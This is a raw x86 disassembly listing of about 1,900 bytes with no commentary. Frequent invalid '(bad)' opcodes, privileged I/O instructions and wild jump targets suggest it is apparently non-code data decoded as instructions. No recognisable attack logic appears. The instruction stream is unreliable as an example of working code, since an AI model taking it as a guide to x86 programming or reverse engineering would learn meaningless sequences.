  41bcc0:	add    eax,0xfbf2de
  41bcc5:	inc    cl
  41bcc7:	or     cl,bl
  41bcc9:	(bad)  
  41bccb:	loop   0x41bc9c
  41bccd:	repnz mov cl,0xe5
  41bcd0:	shl    BYTE PTR [eax-0x454e2b05],1
  41bcd6:	mov    bh,0xb7
  41bcd8:	retf   0xfed2
  41bcdb:	retf   0xd9c1
  41bcde:	rcl    esi,cl
  41bce0:	test   eax,0xf0d6fcc5
  41bce6:	push   cs
  41bce7:	out    0xe1,eax
  41bce9:	fucomp st(1)
  41bceb:	shl    DWORD PTR [edi-0x2a2e3b52],cl
  41bcf1:	rcl    edi,0xc9
  41bcf4:	rol    esp,0xd4
  41bcf7:	les    edi,FWORD PTR [edi-0x243130]
  41bcfd:	fdivr  st(1),st
  41bcff:	add    cl,al
  41bd01:	(bad)  
  41bd02:	(bad)
  41bd05:	or     eax,ecx
  41bd07:	jecxz  0x41bce5
  41bd09:	add    al,0x3
  41bd0b:	adc    eax,eax
  41bd0d:	loopne 0x41bcd4
  41bd0f:	rcl    ebx,0xec
  41bd12:	in     eax,dx
  41bd13:	icebp  
  41bd14:	iret   
  41bd15:	icebp  
  41bd16:	in     al,0xbe
  41bd18:	idiv   bl
  41bd1a:	jmp    0x41bcda
  41bd1c:	aad    0xdf
  41bd1e:	lock mov ah,0xd4
  41bd21:	shl    ecx,cl
  41bd23:	shl    eax,0xe7
  41bd26:	shl    esp,0xc7
  41bd29:	(bad)  
  41bd2b:	repz test eax,0xe6cfecca
  41bd31:	ret    
  41bd32:	cli    
  41bd33:	test   al,0xba
  41bd35:	fsubr  st,st(1)
  41bd37:	std    
  41bd38:	mov    ebp,0xe9e1c9cf
  41bd3d:	test   bl,0xc0
  41bd40:	rol    BYTE PTR [ebx],0xe3
  41bd43:	(bad)  
  41bd45:	loopne 0x41bd26
  41bd47:	enter  0xd9e4,0xde
  41bd4b:	in     al,0xe8
  41bd4d:	jecxz  0x41bd20
  41bd4f:	repnz shr bl,cl
  41bd52:	mov    cl,0xc4
  41bd54:	out    dx,al
  41bd55:	int    0xc7
  41bd57:	mov    edi,0xc9caf8cc
  41bd5c:	(bad)  
  41bd5d:	repz out dx,eax
  41bd5f:	loop   0x41bd3e
  41bd61:	rol    DWORD PTR [esi+eiz*8],1
  41bd64:	(bad)  
  41bd66:	add    ecx,ebx
  41bd68:	jmp    0xcb1bc95b
  41bd6d:	icebp  
  41bd6e:	scas   eax,DWORD PTR es:[edi]
  41bd6f:	in     eax,0xf3
  41bd71:	rcl    esp,0xd1
  41bd74:	(bad)  
  41bd75:	xlat   BYTE PTR ds:[ebx]
  41bd76:	repz (bad) 
  41bd78:	jmp    0xc437a16e
  41bd7d:	int3   
  41bd7e:	mov    esp,0xe5e7d1e1
  41bd83:	(bad)  
  41bd87:	rcr    bh,0xe9
  41bd8a:	clc    
  41bd8b:	adc    ebx,eax
  41bd8d:	test   al,0xb3
  41bd8f:	mov    bh,0xcb
  41bd91:	into   
  41bd92:	mov    dh,0xe5
  41bd94:	repz aam 0xd5
  41bd97:	(bad)  
  41bd98:	(bad)  
  41bd9a:	retf   0xccbe
  41bd9d:	loopne 0x41bd5b
  41bd9f:	(bad)  
  41bda0:	(bad)  
  41bda1:	fadd   st,st(0)
  41bda3:	fild   WORD PTR [esi]
  41bda5:	ret    0xfbc8
  41bda8:	mov    DWORD PTR [ebx],0xf3c8cede
  41bdae:	ret    
  41bdaf:	cmc    
  41bdb0:	(bad)  
  41bdb1:	mov    bl,0xef
  41bdb3:	mov    bl,0xf9
  41bdb5:	stc    
  41bdb6:	in     al,dx
  41bdb7:	div    BYTE PTR [edi-0x290a0c18]
  41bdbd:	cli    
  41bdbe:	test   DWORD PTR [edi],0xdfd4d2e6
  41bdc4:	add    cl,BYTE PTR [ebx]
  41bdc6:	sti    
  41bdc7:	mov    esp,0xcae009df
  41bdcd:	test   al,0xbc
  41bdcf:	iret   
  41bdd0:	iret   
  41bdd1:	mov    dl,0xf5
  41bdd3:	les    edi,FWORD PTR [ebx-0x20333328]
  41bdd9:	mov    edx,0xf7facdbd
  41bdde:	div    dh
  41bde0:	fdivrp st(0),st
  41bde2:	add    eax,0xe9c8c9d2
  41bde7:	add    al,0xcb
  41bde9:	sysret 
  41bdeb:	(bad)  
  41bded:	ret    
  41bdee:	jmp    0xc1c4:0xb7c4f3d0
  41bdf5:	icebp  
  41bdf6:	fnstenv [eax-0x27244127]
  41bdfc:	aam    0xd6
  41bdfe:	out    dx,al
  41bdff:	ret    0xc0c3
  41be02:	not    al
  41be04:	stc    
  41be05:	loop   0x41be0b
  41be07:	mov    esp,0xcfe9c5d9
  41be0c:	retf   0xe5cf
  41be0f:	test   al,0xb2
  41be11:	shr    edx,0xf3
  41be14:	mov    al,0xfb
  41be16:	mov    ah,0xdb
  41be18:	iret   
  41be19:	jecxz  0x41bdcc
  41be1b:	xlat   BYTE PTR ds:[ebx]
  41be1c:	int3   
  41be1d:	aam    0xbf
  41be1f:	fild   WORD PTR ds:0xda02dbe1
  41be25:	leave  
  41be26:	(bad)  
  41be27:	out    dx,al
  41be28:	fsubr  st,st(2)
  41be2a:	fmul   st(4),st
  41be2c:	lods   al,BYTE PTR ds:[esi]
  41be2d:	loop   0x41bddb
  41be2f:	scas   eax,DWORD PTR es:[edi]
  41be30:	icebp  
  41be31:	in     eax,dx
  41be32:	mov    ebx,0xf5dacbf7
  41be37:	xlat   BYTE PTR ds:[ebx]
  41be38:	retf   0xbbd5
  41be3b:	in     al,dx
  41be3c:	in     eax,dx
  41be3d:	sti    
  41be3e:	ret    
  41be3f:	idiv   BYTE PTR [ebp-0x4210100]
  41be45:	loopne 0x41be3f
  41be47:	into   
  41be48:	in     eax,0xdd
  41be4a:	(bad)  
  41be4c:	mov    bl,0xb2
  41be4e:	mov    esi,0xe4f0d7b2
  41be53:	out    0xb6,al
  41be55:	sti    
  41be56:	(bad)  
  41be57:	(bad)  
  41be59:	add    ebx,esi
  41be5b:	mov    eax,0xe3fcf2fc
  41be60:	(bad)  
  41be62:	(bad)  
  41be63:	idiv   ecx
  41be65:	(bad)  
  41be66:	loope  0x41be42
  41be68:	(bad)  
  41be69:	cld    
  41be6a:	jmp    0xc7009d5e
  41be6f:	ret    
  41be70:	mov    bh,0xad
  41be72:	out    0xb2,al
  41be74:	scas   eax,DWORD PTR es:[edi]
  41be75:	enter  0xb9c4,0xff
  41be79:	jmp    0xc1faae32
  41be7e:	call   edx
  41be80:	pop    es
  41be81:	shl    esp,cl
  41be83:	add    cl,ch
  41be85:	inc    DWORD PTR [edi]
  41be87:	cli    
  41be88:	retf   0xfce0
  41be8b:	(bad)  
  41be8d:	mov    ebp,0xd6b2e5b7
  41be92:	iret   
  41be93:	lock mov ebx,0xdac9f5f5
  41be99:	lock cld 
  41be9b:	mov    ecx,0xb8dbf7cc
  41bea0:	(bad)  
  41bea2:	fsubrp st(4),st
  41bea4:	not    eax
  41bea6:	(bad)  
  41bea7:	sti    
  41bea8:	in     al,0xe4
  41beaa:	or     bh,al
  41beac:	fdivr  DWORD PTR [esi-0xa1a1c0d]
  41beb2:	test   eax,0xcefac8ba
  41beb7:	rcr    ecx,cl
  41beb9:	mov    ch,0xee
  41bebb:	mov    ebx,0xe1dbf3cd
  41bec0:	cmc    
  41bec1:	shl    ah,1
  41bec3:	jmp    0x651a9a7
  41bec8:	or     al,0xfc
  41beca:	or     al,0xe3
  41becc:	shl    al,1
  41bece:	ret    0xd3ea
  41bed1:	enter  0xdaec,0xef
  41bed5:	jmp    0x41becf
  41bed7:	jmp    0xe91bb7a0
  41bedc:	in     al,dx
  41bedd:	lock loop 0x41bead
  41bee0:	push   es
  41bee1:	ffree  st(7)
  41bee3:	or     edi,ebp
  41bee5:	enter  0xdcde,0x5
  41bee9:	cli    
  41beea:	leave  
  41beeb:	add    edi,esp
  41beed:	fdiv   st,st(7)
  41beef:	out    0xf7,al
  41bef1:	out    0xca,eax
  41bef3:	out    0xf1,eax
  41bef5:	cmc    
  41bef6:	out    dx,al
  41bef7:	fdivr  DWORD PTR [ebx-0xd210634]
  41befd:	(bad)  
  41befe:	mov    ebp,0xf9d3ec
  41bf03:	aam    0xca
  41bf05:	fiadd  DWORD PTR [eax]
  41bf07:	fmul   st(1),st
  41bf09:	fst    st(3)
  41bf0b:	int    0xc5
  41bf0d:	fdiv   st,st(3)
  41bf0f:	into   
  41bf10:	xlat   BYTE PTR ds:[ebx]
  41bf11:	hlt    
  41bf12:	int    0xb2
  41bf14:	loopne 0x41bf11
  41bf16:	mov    cl,0xf6
  41bf18:	in     eax,0xf7
  41bf1a:	(bad)  
  41bf1c:	mov    esi,0xd90200db
  41bf21:	cld    
  41bf22:	rol    DWORD PTR [edi],0xc0
  41bf25:	jmp    0xa409531
  41bf2a:	retf   0xc8e1
  41bf2d:	jmp    0x41bef7
  41bf2f:	retf   
  41bf30:	in     al,dx
  41bf31:	stos   BYTE PTR es:[edi],al
  41bf32:	repnz int3 
  41bf34:	in     al,dx
  41bf35:	fcomip st,st(4)
  41bf37:	std    
  41bf38:	mov    ch,0xc9
  41bf3a:	fyl2x  
  41bf3c:	int3   
  41bf3d:	mov    esp,0xf3e6f8d2
  41bf42:	test   BYTE PTR [eax],0xdc
  41bf45:	out    0x4,eax
  41bf47:	or     ebx,ebx
  41bf49:	(bad)  
  41bf4a:	adc    al,BYTE PTR [ebx]
  41bf4c:	(bad)  
  41bf4d:	mov    dl,0xd1
  41bf4f:	imul   bl
  41bf51:	aad    0xdb
  41bf53:	ret    0xf0b6
  41bf56:	out    dx,al
  41bf57:	int    0xce
  41bf59:	std    
  41bf5a:	repz cld 
  41bf5c:	sar    edx,0xd1
  41bf5f:	cli    
  41bf60:	mov    DWORD PTR [esi],0xefe202eb
  41bf66:	(bad)  
  41bf67:	bswap  esi
  41bf69:	fst    DWORD PTR [ebx]
  41bf6b:	fadd   st,st(1)
  41bf6d:	mov    eax,0xdceac7dc
  41bf72:	out    0xfa,al
  41bf74:	sar    ebx,1
  41bf76:	stc    
  41bf77:	(bad)  
  41bf79:	mov    ebx,0xdce1d7bb
  41bf7e:	cld    
  41bf7f:	push   es
  41bf80:	rcl    edx,1
  41bf82:	fcmove st,st(2)
  41bf84:	add    al,0xd0
  41bf86:	add    dl,ch
  41bf88:	jmp    ebx
  41bf8a:	adc    cl,BYTE PTR ds:0xe9f0c6b1
  41bf90:	imul   DWORD PTR [ebp-0x2a2d0445]
  41bf96:	stc    
  41bf97:	mov    ebx,0xd0fdced6
  41bf9c:	enter  0xe0f0,0xf1
  41bfa0:	(bad)  
  41bfa2:	mov    ebp,0xc109e2e5
  41bfa7:	pop    es
  41bfa8:	iret   
  41bfa9:	fmul   QWORD PTR [edi]
  41bfab:	in     al,dx
  41bfac:	repz icebp 
  41bfae:	(bad)  
  41bfaf:	fsubp  st(2),st
  41bfb1:	(bad)  
  41bfb2:	out    0xea,eax
  41bfb4:	into   
  41bfb5:	cli    
  41bfb6:	sar    BYTE PTR [edi-0x4f15223c],cl
  41bfbc:	fmul   st(5),st
  41bfbe:	in     al,dx
  41bfbf:	aad    0xd5
  41bfc1:	loope  0x41bf93
  41bfc3:	mov    DWORD PTR [ecx],0xe6c9c50f
  41bfc9:	repz out 0xb,eax
  41bfcc:	rol    bl,cl
  41bfce:	mov    ebp,0xe2d2ace6
  41bfd3:	leave  
  41bfd4:	(bad)  
  41bfd6:	mov    ch,0xfe
  41bfd8:	mov    esi,0xfcf8d1c4
  41bfdd:	enter  0xfac2,0xe0
  41bfe1:	ret    
  41bfe2:	std    
  41bfe3:	in     al,0xf5
  41bfe5:	sar    edx,0xf
  41bfe8:	std    
  41bfe9:	loopne 0x41bfac
  41bfeb:	repz mov ecx,0xe2bcf2d2
  41bff1:	jmp    0xfdec:0xd0b0b2c5
  41bff8:	not    ebp
  41bffa:	add    cl,cl
  41bffc:	repz clc 
  41bffe:	icebp  
  41bfff:	loopne 0x41bfc8
  41c001:	jecxz  0x41bfd3
  41c003:	fadd   st,st(0)
  41c005:	add    al,0xfd
  41c007:	in     al,0xc6
  41c009:	cld    
  41c00a:	or     eax,DWORD PTR [edx]
  41c00c:	iret   
  41c00d:	icebp  
  41c00e:	fistp  QWORD PTR [esi-0x3f0a5523]
  41c014:	(bad)  
  41c015:	retf   
  41c016:	out    0xe5,al
  41c018:	mov    esi,0xd4e2fbb8
  41c01d:	faddp  st(1),st
  41c01f:	xlat   BYTE PTR ds:[ebx]
  41c020:	(bad)  
  41c021:	rcr    ebp,1
  41c023:	fld    st(1)
  41c025:	in     al,0xf
  41c027:	in     eax,0xe4
  41c029:	out    0xda,eax
  41c02b:	call   0xf3288003
  41c030:	shr    BYTE PTR [edx+eiz*8-0x14174932],cl
  41c037:	mov    dh,0xbb
  41c039:	fsubr  st,st(2)
  41c03b:	enter  0x2c9,0xdb
  41c03f:	(bad)  
  41c040:	aam    0xf3
  41c042:	mov    ebp,0xc0d0f6c3
  41c047:	jecxz  0x41c033
  41c049:	sti    
  41c04a:	out    dx,al
  41c04b:	or     eax,esi
  41c04d:	(bad)  
  41c04e:	enter  0xeac7,0xaa
  41c052:	retf   
  41c053:	in     al,dx
  41c054:	(bad)  
  41c055:	xlat   BYTE PTR ds:[ebx]
  41c056:	mov    ecx,0xb9f9c8f4
  41c05b:	neg    ah
  41c05d:	loopne 0x41c032
  41c05f:	stc    
  41c060:	cld    
  41c061:	ftst   
  41c063:	retf   0xe907
  41c066:	stc    
  41c067:	or     dh,ch
  41c069:	(bad)
  41c06c:	retf   0xe7eb
  41c06f:	repz icebp 
  41c071:	mov    ah,0xf3
  41c073:	call   0xd7ef9661
  41c078:	repnz stc 
  41c07a:	cli    
  41c07b:	retf   0xbac3
  41c07e:	fcomip st,st(6)
  41c080:	aam    0xc3
  41c082:	mov    ebp,0xe1e6f1f6
  41c087:	retf   0x5cd
  41c08a:	iret   
  41c08b:	inc    ah
  41c08d:	lods   eax,DWORD PTR ds:[esi]
  41c08e:	out    dx,al
  41c08f:	imul   bl
  41c091:	retf   0xcfd6
  41c094:	into   
  41c095:	in     eax,0xb6
  41c097:	out    dx,al
  41c098:	(bad)  
  41c099:	cld    
  41c09a:	out    dx,al
  41c09b:	jmp    0xe6239b9f
  41c0a0:	fmul   QWORD PTR [ebx]
  41c0a2:	(bad)  
  41c0a3:	aad    0xfa
  41c0a5:	or     DWORD PTR ds:0xecc2fdfb,eax
  41c0ab:	add    BYTE PTR [ecx-0x1f2c1609],dh
  41c0b1:	stos   BYTE PTR es:[edi],al
  41c0b2:	sti    
  41c0b3:	cmc    
  41c0b4:	les    edi,FWORD PTR [eax-0x812123b]
  41c0ba:	mov    ecx,0xdcced3b0
  41c0bf:	cli    
  41c0c0:	sti    
  41c0c1:	mov    esi,0xfbf5e5fe
  41c0c6:	out    dx,eax
  41c0c7:	fst    st(5)
  41c0c9:	aam    0x13
  41c0cb:	or     al,0xdd
  41c0cd:	mov    ebp,0xe6f1ebbd
  41c0d2:	call   0xee3db7a6
  41c0d7:	icebp  
  41c0d8:	in     al,dx
  41c0d9:	(bad)  
  41c0da:	mov    edx,0xf0be01bf
  41c0df:	(bad)  
  41c0e0:	in     eax,0xf2
  41c0e2:	fadd   st(7),st
  41c0e4:	leave  
  41c0e5:	out    0xd4,eax
  41c0e7:	inc    ah
  41c0e9:	in     al,0xc4
  41c0eb:	fld    st(6)
  41c0ed:	xlat   BYTE PTR ds:[ebx]
  41c0ee:	mov    ebp,0xe1e9e9f0
  41c0f3:	div    BYTE PTR [ebp-0x4c333b0f]
  41c0f9:	in     al,dx
  41c0fa:	enter  0xf0fa,0xd8
  41c0fe:	cli    
  41c0ff:	add    DWORD PTR [esi],eax
  41c101:	idiv   ch
  41c103:	cld    
  41c104:	xlat   BYTE PTR ds:[ebx]
  41c105:	aad    0xee
  41c107:	iret   
  41c108:	out    0xca,eax
  41c10a:	add    al,0xdd
  41c10c:	in     al,dx
  41c10d:	in     eax,0xbd
  41c10f:	lods   al,BYTE PTR ds:[esi]
  41c110:	retf   0xcce1
  41c113:	cmc    
  41c114:	iret   
  41c115:	cli    
  41c116:	cli    
  41c117:	int3   
  41c118:	mov    ebp,0xc9ccfdd0
  41c11d:	out    dx,eax
  41c11e:	ret    
  41c11f:	(bad)  
  41c120:	rcl    ch,1
  41c122:	add    eax,0xfdcbf40b
  41c127:	(bad)  
  41c128:	pmuludq mm3,mm5
  41c12b:	add    BYTE PTR [edi-0x35355329],bh
  41c131:	shr    bl,0xf9
  41c134:	rol    ch,cl
  41c136:	fcomp  st(3)
  41c138:	std    
  41c139:	in     al,0xb4
  41c13b:	in     eax,dx
  41c13c:	enter  0xdafc,0xde
  41c140:	loopne 0x41c124
  41c142:	lock icebp 
  41c144:	hlt    
  41c145:	mul    dh
  41c147:	out    0xdd,al
  41c149:	(bad)  
  41c14a:	out    0xfc,eax
  41c14c:	repz in al,0xcd
  41c14f:	icebp  
  41c150:	retf   
  41c151:	aad    0xea
  41c153:	retf   
  41c154:	not    edx
  41c156:	out    dx,al
  41c157:	in     al,0xb7
  41c159:	out    dx,eax
  41c15a:	(bad)  
  41c15c:	call   0xff15b83a
  41c161:	add    ah,bh
  41c163:	jmp    0xdd2ba12a
  41c168:	or     esi,edi
  41c16a:	int3   
  41c16b:	(bad)  
  41c16c:	jmp    0xccee8c20
  41c171:	shl    ah,1
  41c173:	out    dx,al
  41c174:	in     al,dx
  41c175:	xlat   BYTE PTR ds:[ebx]
  41c176:	shr    DWORD PTR [esp+ebp*8-0x26282b16],cl
  41c17d:	repz (bad) 
  41c17f:	loopne 0x41c178
  41c181:	std    
  41c182:	jmp    0xd8fa:0xc9d001d8
  41c189:	add    eax,0xeaabf1ea
  41c18e:	imul   bh
  41c190:	(bad)  
  41c191:	call   0xd416b248
  41c196:	jmp    0x41c183
  41c198:	in     eax,dx
  41c199:	in     eax,dx
  41c19a:	mov    esi,0xdccdf2b9
  41c19f:	sar    dh,cl
  41c1a1:	ret    
  41c1a2:	inc    ch
  41c1a4:	or     BYTE PTR [edi],cl
  41c1a6:	(bad)  
  41c1a8:	out    0xc2,al
  41c1aa:	fild   WORD PTR [esi]
  41c1ac:	fsubrp st(5),st
  41c1ae:	icebp  
  41c1af:	mov    esp,0xe7f3c0c0
  41c1b4:	loope  0x41c184
  41c1b6:	out    0xf7,eax
  41c1b8:	fcmovnu st,st(4)
  41c1ba:	cli    
  41c1bb:	mov    ebx,0xbdf1bdd4
  41c1c0:	mov    ebx,0xdc02bdd8
  41c1c5:	add    eax,0xd8cf0acf
  41c1ca:	into   
  41c1cb:	into   
  41c1cc:	mov    bl,0xec
  41c1ce:	mov    bh,0xd3
  41c1d0:	aam    0xac
  41c1d2:	(bad)  
  41c1d3:	mov    edx,0xfbbbe4c5
  41c1d8:	enter  0xfaea,0xde
  41c1dc:	fcom   st(1)
  41c1de:	repz loope 0x41c1e0
  41c1e1:	inc    DWORD PTR [ebx*8-0x233f1810]
  41c1e8:	(bad)  
  41c1e9:	loopne 0x41c1fe
  41c1eb:	clc    
  41c1ec:	out    dx,eax
  41c1ed:	jmp    0xccf4:0xc0bca4b2
  41c1f4:	aad    0xb6
  41c1f6:	(bad)  
  41c1f8:	retf   
  41c1f9:	(bad)  
  41c1fb:	sar    DWORD PTR [edx-0x50120],cl
  41c201:	xlat   BYTE PTR ds:[ebx]
  41c202:	mov    ebp,0xde9df09
  41c208:	std    
  41c209:	(bad)  
  41c20b:	(bad)  
  41c20d:	jmp    0xd42a8601
  41c212:	loop   0x41c1ff
  41c214:	shl    al,0xcd
  41c217:	xlat   BYTE PTR ds:[ebx]
  41c218:	fcomi  st,st(5)
  41c21a:	(bad)  
  41c21b:	repnz fiadd DWORD PTR [edi]
  41c21e:	ret    
  41c21f:	shl    al,1
  41c221:	(bad)  
  41c223:	(bad)
  41c227:	retf   
  41c228:	in     eax,0xcb
  41c22a:	or     bh,bh
  41c22c:	(bad)  
  41c22d:	jmp    0x41c1d8
  41c22f:	shr    dh,1
  41c231:	loop   0x41c216
  41c233:	mov    ch,0xd0
  41c235:	out    dx,eax
  41c236:	repz jmp 0xded0:0xd1fff0e9
  41c23e:	cmc    
  41c23f:	mov    esp,0xe4c404e4
  41c244:	add    eax,ecx
  41c246:	leave  
  41c247:	in     eax,0xa
  41c249:	(bad)  
  41c24b:	push   cs
  41c24c:	mov    ebp,0xe3bee2c4
  41c251:	int    0xc0
  41c253:	shl    BYTE PTR [esi-0x1a412f16],1
  41c259:	aad    0xbd
  41c25b:	jmp    0xf8bd:0x5d0bccc
  41c262:	ret    
  41c263:	loopne 0x41c256
  41c265:	std    
  41c266:	cmc    
  41c267:	jmp    0x419c561
  41c26c:	(bad)  
  41c26d:	rcl    ecx,cl
  41c26f:	call   0xc803aa51
  41c274:	jmp    0xf4b6:0xc4d6eeef
  41c27b:	repz fsubr st(1),st
  41c27e:	fsub   st,st(6)
  41c280:	(bad)  
  41c281:	in     al,0xd4
  41c283:	jmp    0x2d8:0xc4d9d9fd
  41c28a:	out    dx,eax
  41c28b:	loope  0x41c275
  41c28d:	in     al,0xa9
  41c28f:	mov    bl,0xe3
  41c291:	(bad)  
  41c292:	ret    
  41c293:	shl    dh,1
  41c295:	mov    ecx,0xb4c9b7de
  41c29a:	retf   
  41c29b:	retf   0xe8d9
  41c29e:	std    
  41c29f:	sar    DWORD PTR [ebp-0x212a1e24],0xda
  41c2a6:	or     ecx,ecx
  41c2a8:	add    eax,0xc5c4d9fb
  41c2ad:	mov    esp,0xf1f1c0de
  41c2b2:	(bad)  
  41c2b3:	retf   
  41c2b4:	mov    ecx,0xc4fab6b1
  41c2b9:	leave  
  41c2ba:	icebp  
  41c2bb:	cld    
  41c2bc:	leave  
  41c2bd:	add    eax,ebx
  41c2bf:	repnz repnz not ecx
  41c2c3:	loope  0x41c2af
  41c2c5:	out    0xfa,eax
  41c2c7:	retf   
  41c2c8:	fild   DWORD PTR [edx]
  41c2ca:	adc    ah,cl
  41c2cc:	les    ebp,FWORD PTR [esi-0x2b0b3957]
  41c2d2:	in     eax,0xbb
  41c2d4:	in     al,0xc5
  41c2d6:	mov    ebx,0xdef0cdf0
  41c2db:	std    
  41c2dc:	icebp  
  41c2dd:	mov    esi,0xc2f1dfe3
  41c2e2:	(bad)  
  41c2e3:	jecxz  0x41c2a8
  41c2e5:	cld    
  41c2e6:	clc    
  41c2e7:	iret   
  41c2e8:	sti    
  41c2e9:	add    esi,esp
  41c2eb:	out    0xc6,eax
  41c2ed:	rol    ah,0xf3
  41c2f0:	int3   
  41c2f1:	out    dx,al
  41c2f2:	not    al
  41c2f4:	jmp    0xb8ee:0xfcfdc8ca
  41c2fb:	ret    
  41c2fc:	mov    ecx,0xfaceec02
  41c301:	cmc    
  41c302:	pop    es
  41c303:	add    al,dl
  41c305:	in     al,0x6
  41c307:	loop   0x41c317
  41c309:	retf   0xe0ca
  41c30c:	leave  
  41c30d:	jecxz  0x41c2fc
  41c30f:	in     eax,0xef
  41c311:	shr    ebp,cl
  41c313:	mov    ebx,0xfec4e9f1
  41c318:	fcomi  st,st(6)
  41c31a:	mov    eax,0xb8f2fdf3
  41c31f:	aam    0xf5
  41c321:	in     eax,0xdc
  41c323:	cli    
  41c324:	(bad)  
  41c325:	loop   0x41c320
  41c327:	(bad)  
  41c328:	(bad)  
  41c329:	inc    DWORD PTR [eax]
  41c32b:	adc    ah,bh
  41c32d:	repnz in eax,dx
  41c32f:	out    dx,al
  41c330:	shl    ecx,1
  41c332:	out    0xdb,eax
  41c334:	mov    al,0xf8
  41c336:	mov    edx,0xbabcc5fa
  41c33b:	(bad)  
  41c33c:	sti    
  41c33d:	rcl    ebx,cl
  41c33f:	(bad)  
  41c341:	icebp  
  41c342:	repnz test DWORD PTR [edi],0xff08ffcb
  41c349:	fimul  DWORD PTR [edi]
  41c34b:	or     dh,ch
  41c34d:	fsub   st(4),st
  41c34f:	mov    dl,0xc4
  41c351:	shr    eax,0xba
  41c354:	mov    bh,0xd8
  41c356:	dec    ecx
  41c358:	sar    ebx,cl
  41c35a:	xlat   BYTE PTR ds:[ebx]
  41c35b:	in     eax,dx
  41c35c:	loopne 0x41c335
  41c35e:	pop    es
  41c35f:	(bad)  
  41c360:	aam    0xfa
  41c362:	retf   
  41c363:	add    ecx,edx
  41c365:	std    
  41c366:	iret   
  41c367:	out    0xf5,al
  41c369:	in     al,dx
  41c36a:	fisttp DWORD PTR [ecx]
  41c36c:	fxch   st(7)
  41c36e:	in     eax,0xeb
  41c370:	stos   DWORD PTR es:[edi],eax
  41c371:	mov    bh,0xd7
  41c373:	jmp    0x41c36f
  41c375:	out    dx,al
  41c376:	cmc    
  41c377:	out    dx,al
  41c378:	mov    ch,0xf5
  41c37a:	out    dx,al
  41c37b:	jecxz  0x41c34d
  41c37d:	cld    
  41c37e:	mov    ch,0xee
  41c380:	idiv   BYTE PTR [ebp-0x3234723]
  41c386:	sti    
  41c387:	cld    
  41c388:	std    
  41c389:	retf   
  41c38a:	fmul   st(6),st
  41c38c:	in     al,dx
  41c38d:	fisub  WORD PTR [ebp-0x312e1b11]
  41c393:	out    0xee,al
  41c395:	jmp    0x41c368
  41c397:	fcom   st(1)
  41c399:	(bad)  
  41c39a:	mov    edx,0xe0dcbcc2
  41c39f:	mov    esp,0xc4fbfbc1
  41c3a4:	jecxz  0x41c3a1
  41c3a6:	out    dx,eax
  41c3a7:	in     al,0x7
  41c3a9:	fcmove st,st(3)
  41c3ab:	(bad)  
  41c3ac:	in     eax,dx
  41c3ad:	repz (bad) 
  41c3af:	jecxz  0x41c382
  41c3b1:	in     eax,0xe8
  41c3b3:	shl    BYTE PTR [eax-0x2d261a47],cl
  41c3b9:	fdivr  QWORD PTR [esi-0x3c112744]
  41c3bf:	ret    
  41c3c0:	(bad)  
  41c3c1:	mov    esi,0xfb0be6c7
  41c3c6:	push   cs
  41c3c7:	leave  
  41c3c8:	fcmove st,st(0)
  41c3ca:	(bad)  [ecx]
  41c3cc:	shr    DWORD PTR [eax-0x24323524],0xc4
  41c3d3:	retf   0xfbed
  41c3d6:	cli    
  41c3d7:	fstp   TBYTE PTR [esi-0x3109fc14]
  41c3dd:	mov    eax,0xf6c202bf
  41c3e2:	(bad)  
  41c3e4:	retf   
  41c3e5:	jmp    0xe6f3:0xc9eb0906
  41c3ec:	repz ret 
  41c3ee:	xlat   BYTE PTR ds:[ebx]
  41c3ef:	fst    st(3)
  41c3f1:	aam    0xb0
  41c3f3:	jmp    0xca17adb8
  41c3f8:	shr    bl,cl
  41c3fa:	neg    edi
  41c3fc:	into   
  41c3fd:	cmc    
  41c3fe:	stc    
  41c3ff:	in     eax,dx
  41c400:	fcmovnb st,st(2)
  41c402:	(bad)  
  41c404:	sar    bl,0xfe
  41c407:	inc    ebp
  41c409:	loop   0x41c3f7
  41c40b:	shl    BYTE PTR [edx-0x19423c29],cl
  41c411:	in     eax,dx
  41c412:	repnz shl ch,0xc9
  41c416:	cmc    
  41c417:	in     eax,0xb3
  41c419:	fucomip st,st(7)
  41c41b:	(bad)  
  41c41c:	loopne 0x41c3fe
  41c41e:	add    dh,BYTE PTR [esp+eiz*8-0x2a19262d]
  41c425:	mov    esi,0xc40fe5f5
  41c42a:	retf   0xedcd
  41c42d:	lods   eax,DWORD PTR ds:[esi]
  41c42e:	mov    esp,0xb3cdeac4
  41c433:	retf   0xdbdb
  41c436:	mov    ah,0xf2
  41c438:	jmp    0xb902:0xf7d8b4cf
  41c43f:	fadd   st,st(7)
  41c441:	int3   
  41c442:	fdivp  st(7),st
  41c444:	(bad)  
  41c446:	or     dh,dh
  41c448:	or     esp,edx
  41c44a:	ror    ebx,cl
  41c44c:	jmp    0x41c43b
  41c44e:	(bad)  
  41c450:	test   bh,0xf5
  41c453:	aad    0xf9
  41c455:	ror    eax,cl
  41c457:	into   
  41c458:	mov    ebx,0xced1c9cd
  41c45d:	in     eax,dx
  41c45e:	fdivr  st(1),st
  41c460:	ret    
  41c461:	loope  0x41c420
  41c463:	fcmove st,st(3)
  41c465:	loop   0x41c472
  41c467:	loope  0x41c447
  41c469:	ret    0xf3e9
  41c46c:	call   0xadf99417
  41c471:	rcl    ebx,1
  41c473:	out    0xd8,al
  41c475:	cli    
  41c476:	mov    ch,0xf0
  41c478:	mov    dh,0xf3
  41c47a:	leave  
  41c47b:	mov    al,0xc1
  41c47d:	(bad)  
  41c47f:	(bad)  
  41c481:	jmp    0x41c486
  41c483:	or     esp,esi
  41c485:	jmp    0xe600:0xd40a0809
  41c48c:	fdivrp st(2),st
  41c48e:	retf   0xafc9
  41c491:	mov    ah,0xd4
  41c493:	lods   al,BYTE PTR ds:[esi]
  41c494:	in     eax,0xda
  41c496:	xlat   BYTE PTR ds:[ebx]
  41c497:	shl    eax,cl
  41c499:	repz mov ecx,0xddecd6f2
  41c49f:	mov    DWORD PTR [ebx+edi*8],0xf7ddd902
  41c4a6:	clc    
  41c4a7:	(bad)  
  41c4a8:	fld    st(2)
  41c4aa:	push   es
  41c4ab:	out    0xe1,al
  41c4ad:	loop   0x41c457
  41c4af:	out    dx,al
  41c4b0:	iret   
  41c4b1:	in     eax,0xb5
  41c4b3:	out    0xcb,eax
  41c4b5:	scas   al,BYTE PTR es:[edi]
  41c4b6:	mov    ebx,0xf3f7dccc
  41c4bb:	jmp    0xe644c493
  41c4c0:	push   es
  41c4c1:	aam    0xff
  41c4c3:	lock clc 
  41c4c5:	out    0xe,al
  41c4c7:	cmc    
  41c4c8:	or     eax,0xeafd07fc
  41c4cd:	mul    ebx
  41c4cf:	mov    dl,0xab
  41c4d1:	call   0xb2fc93bb
  41c4d6:	mov    ebx,0xd4ffb4b7
  41c4db:	std    
  41c4dc:	in     eax,dx
